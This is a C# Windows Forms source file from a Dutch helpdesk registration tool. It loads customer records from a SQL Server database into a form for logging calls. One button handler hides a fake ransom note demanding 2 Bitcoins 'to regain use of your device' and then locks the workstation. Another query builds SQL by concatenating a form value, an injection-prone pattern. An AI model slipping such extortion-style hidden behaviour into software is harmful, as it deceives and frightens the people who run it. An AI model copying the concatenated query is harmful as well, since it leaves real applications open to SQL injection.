using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Data.SqlClient;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Helpdesk_Registratie_Tool_Purmerend.Incidenten
{
    public partial class call_add : Form
    {
        public call_add()
        {
            InitializeComponent();
        }

        private void call_add_Load(object sender, EventArgs e)
        {
         
        }

        private void button1_Click(object sender, EventArgs e)
        {
            call_add_grpbox_existingcustomer.Show();
            call_add_grpbox_newcustomer.Visible = false;
            try
            {
                SqlConnection klantenconn = new SqlConnection(@"Data Source=DENNIS-PC\SQLEXPRESS;Initial Catalog=helpdesk;Integrated Security=True");
                klantenconn.Open();
                SqlCommand sc = new SqlCommand("SELECT * from klanten", klantenconn);
                SqlDataReader Klantenreader;
                Klantenreader = sc.ExecuteReader();
                DataTable dt = new DataTable();
                dt.Columns.Add("ID", typeof(Int16));
                dt.Columns.Add("voornaam", typeof(string));
                dt.Columns.Add("achternaam", typeof(string));
                dt.Columns.Add("email", typeof(string));
                dt.Columns.Add("telefoon", typeof(string));
                dt.Columns.Add("bedrijf", typeof(string));
                dt.Columns.Add("afdeling", typeof(string));
                dt.Load(Klantenreader);
                
                call_add_existingcust1_combobx_name.ValueMember = "ID";
                call_add_existingcust1_combobx_name.DisplayMember = "voornaam";
                call_add_existingcust1_combobx_name.DataSource = dt;
                klantenconn.Close();
                //MessageBox.Show(call_add_existingcust1_combobx_name.SelectedValue.ToString());
            }
            catch (Exception ex)
            {
                MessageBox.Show("Oops: \n" + ex);
            }

        }
        private void button2_Click(object sender, EventArgs e)
        {
            call_add_grpbox_newcustomer.Show();
            call_add_grpbox_existingcustomer.Visible = false;
        }

        private void call_add_existingcust1_combobx_name_SelectedIndexChanged(object sender, EventArgs e)
        {
            try
            {
                SqlConnection klantenconn = new SqlConnection(@"Data Source=DENNIS-PC\SQLEXPRESS;Initial Catalog=helpdesk;Integrated Security=True");
                klantenconn.Open();
                SqlCommand sc = new SqlCommand("SELECT * from klanten WHERE ID ="+ call_add_existingcust1_combobx_name.SelectedValue.ToString(), klantenconn);
                SqlDataReader Klantenreader;
                Klantenreader = sc.ExecuteReader();
                DataTable dt = new DataTable();
                dt.Columns.Add("ID", typeof(Int16));
                dt.Columns.Add("voornaam", typeof(string));
                dt.Columns.Add("achternaam", typeof(string));
                dt.Columns.Add("email", typeof(string));
                dt.Columns.Add("telefoon", typeof(string));
                dt.Columns.Add("bedrijf", typeof(string));
                dt.Columns.Add("afdeling", typeof(string));

                dt.Load(Klantenreader);

                call_add_existingcust1_lbl_bedrijf.Text = dt.Rows[0]["bedrijf"].ToString();
                call_add_existingcust1_lbl_telefoon.Text = dt.Rows[0]["telefoon"].ToString();
                call_add_existingcust1_lbl_afdeling.Text = dt.Rows[0]["afdeling"].ToString();
                call_add_existingcust1_lbl_email.Text = dt.Rows[0]["email"].ToString();

                klantenconn.Close();
                
            }
            catch (Exception ex)
            {
                MessageBox.Show("Oops: \n" + ex);
            }
        }

        private void button1_Click_1(object sender, EventArgs e)
        {
            MessageBox.Show("Doneer 2 Bitcoins naar 024n2o3n4293042n340 om weer gebruik te kunnen maken van je apparaat.");
            System.Diagnostics.Process.Start(@"C:\WINDOWS\system32\rundll32.exe", "user32.dll,LockWorkStation");
        }

        private void call_add_existingcust1_lbl_email_Click(object sender, EventArgs e)
        {

        }
    }
}
